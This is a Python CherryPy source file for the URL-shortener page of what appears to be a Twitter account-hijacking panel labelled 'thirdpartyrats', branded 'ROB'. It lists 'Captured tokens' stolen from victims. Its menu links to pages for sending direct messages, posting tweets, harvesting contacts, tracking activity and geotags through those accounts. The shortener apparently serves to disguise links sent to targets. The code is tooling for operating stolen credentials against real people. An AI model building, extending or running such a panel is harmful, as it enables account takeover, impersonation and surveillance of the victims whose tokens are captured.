import os, os.path
import random
import string
from assets.getTokens import *
from TwitterAPI import TwitterAPI
import json
import cherrypy

from assets.UrlShort import *


class StringGeneratorUrl(object):
    @cherrypy.expose
    def index(self):
        tokens_list = getTokens();
        consumer_key = '';
        shortUrl = '';

        if "consumer_key" in cherrypy.session.keys():
            consumer_key = cherrypy.session["consumer_key"];

        if "shortUrl" in cherrypy.session.keys():
            shortUrl= cherrypy.session["shortUrl"];

        return """<!DOCTYPE html> 
               <html>
               <head>
                  <title> روب ROB </title>
                  <meta name="description" content="website description" />
                  <meta name="keywords" content="website keywords, website keywords" />
                  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
                  <meta http-equiv="Pragma" content="no-cache">
                  <meta http-equiv="Expires" content="-1">
                  <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
                  <link rel="stylesheet" type="text/css" href="assets/css/style.css" />
                  <link rel='stylesheet' id='theme53935-css' href='http://livedemo00.template-help.com/wordpress_53935/wp-content/themes/theme53935/main-style.css' type='text/css' media='all'/>
                  <!-- modernizr enables HTML5 elements and feature detects -->
                  <script type="text/javascript" src="assets/js/modernizr-1.5.min.js"></script>
                    <script>
                    function setUrl(){
                        document.getElementById("original_url").value = localStorage.getItem('copiedUrl')
                        document.getElementById("urlShortLink").value = \""""+shortUrl+"""\"
                    }
                    </script>
                  </head>
                  <body onload="setUrl()">
                     <div id="main">
                        <header>
                           <div id="logo">
                              <a href="Token.html"><img id="logo1" src="assets/images/kuwaithackers.jpeg" alt="ROB روب""><img id="logo2" src="assets/images/logo.png" alt="ROB روب""></a>
                           </div>
                           <!--close welcome-->          
                        </header>
                        <nav>
                           <div id="menubar">
                              <ul id="nav">
                              <li><a href="/thirdpartyrats/twitter/tokens">TOKEN</a></li>
                              <li><a href="/thirdpartyrats/twitter/directMessage">DIRECT-MESSAGE</a></li>
                              <li><a href="/thirdpartyrats/twitter/postTweet">TWEETS</a></li>
                              <li><a href="/thirdpartyrats/twitter/getContacts">CONTACTS</a></li>
                              <li><a href="/thirdpartyrats/twitter/userActivity">USER-ACTIVITY</a></li>
                              <li><a href="/thirdpartyrats/twitter/geoTagging">GEO-TAG</a></li>
                              <li><a href="/thirdpartyrats/twitter/apps">TWITTER-APPS</a></li>
                              <li class="current"><a href="/thirdpartyrats/twitter/urlShortener">URL-SHORTENER</a></li>
                              </ul>
                           </div>
                           <!--close menubar-->  
                        </nav>
                        <div id="site_content">
                           <div class="sidebar_container">
                              <div class="sidebar">
                                 <div style="text-align: center;">
                                    <span style="font-weight: bold;">
                                       <h2>&#1604;&#1608;&#1581;&#1577;
                                          &#1575;&#1604;&#1578;&#1581;&#1603;&#1605; &#1604;&#1578;&#1591;&#1576;&#1610;&#1602;&#1575;&#1578;
                                          &#1578;&#1608;&#1578;&#1610;&#1585;&nbsp;&nbsp;&nbsp;<br>Captured tokens
                                       </h2>
                                    </span>
                                    <br>
                                    <br>
                                    <br>
                                    <form method="post" action="javascript:;">
                                        <select size="12" id="tokenlist" name="tokenlist" style="width: 70%; padding: 10px; margin-bottom: 10px;">
                                  """+tokens_list+"""
                                        </select>
                                        <br>
                                    <input onclick="handleSelectedToken()" type="submit" value="Load Token"/>
                                   </form>
                                    <br>
                                 </div>
                              </div>
                              <!--close sidebar-->    
                           </div>
                           <!--close sidebar_container-->  
                            <div id="content" class="container_url_shortener" style="padding-top: 10px;">
                              <form method="post" action="makeUrlShort" name="dm" id="urlform" style="margin-left: 20px;">
                                 <h1 style="font-weight: bold; margin-bottom: 10px; margin-top: 13px; color: #f1f1f1;">Url Shortener:</h1>
                                 <label>Original Url: </label>
                                 <input type="text" id="original_url" name="original_url" height="30" style="width: 800px;"><br><br>
                                 <input type="radio" id="tinyurl" name="urltype" value="tinyurl" checked>&ensp;<label for="tinyurl">TinyUrl</label>&emsp;
                                 <input type="radio" id="isgdurl" name="urltype" value="isgdurl">&ensp;<label for="isgdurl">ISGDUrl</label>&emsp;
                                 <input type="radio" id="chilpit" name="urltype" value="chilpit">&ensp;<label for="chilpit">CHILPIT</label>&emsp;
                                 <input type="radio" id="clckru" name="urltype" value="clckru">&ensp;<label for="clckru">CLCKRU</label>&emsp;
                                 <input type="radio" id="dagd" name="urltype" value="dagd">&ensp;<label for="dagd">DAGD</label>&emsp;
                                 <input type="radio" id="nullptr" name="urltype" value="nullptr">&ensp;<label for="nullptr">NULLPTR</label>&emsp;
                                 <input type="radio" id="osdb" name="urltype" value="osdb">&ensp;<label for="osdb">OSDB</label>&emsp;
                                 <input type="radio" id="qpsru" name="urltype" value="qpsru">&ensp;<label for="qpsru">QPSRU</label>&emsp;
                                 <input form="urlform" type="submit" value="Get ShortUrl"/>
                              </form>
                            </div>
                           <!--close content-->   
                        </div>
                        <!--close site_content-->    
                        <footer>
                        </footer>
                        <input align="center" type="text" style="width:700px !important; height:60px !important; font-size:40px !important;" id="urlShortLink" name="urlShortLink" />               
                    </div>
                     <!--close main-->
                     <style type="text/css">
                        #tokenlist option{
                          font-size: 16px;
                          font-family: "Open Sans", sans-serif;
                        }
                        #tokenlist, #dmTextArea{
                          border: 4px ridge white;
                        }
                        #dmTextArea{
                          border-radius: 10px;
                        }
                        #urlShortLink {
                            background-color : transparent;
		                    border-color: transparent;
                            color: #0c9fe8;
                            margin: 0;
                            position: absolute;
                            left: 45%;
                            margin-left: -.4em;
                        }
                        
                     </style>
                     <!-- javascript at the bottom for fast page loading -->
                     <script type="text/javascript" src="assets/js/jquery.min.js"></script>
                     <script type="text/javascript" src='assets/js/getTokenDetails.js'></script>

                    <script>
                    function handleSelectedToken(){
                    var selector = document.getElementById('tokenlist');
                    var selectedToken = selector[selector.selectedIndex].value;
                    getTokenDetails('"""+consumer_key+"""')
                    }
                    </script>
                  </body>
               </html>"""


    @cherrypy.expose
    def makeUrlShort(self, original_url=None, urltype=None):
        print("URLType: "+urltype);
        print("Reverse Lookup:" + str(UrlShort.reverseLookup(urltype)))
        cherrypy.session['shortUrl'] = UrlShort.getShortenedUrl(original_url,UrlShort.reverseLookup(urltype));
        raise cherrypy.HTTPRedirect("/thirdpartyrats/twitter/urlShortener");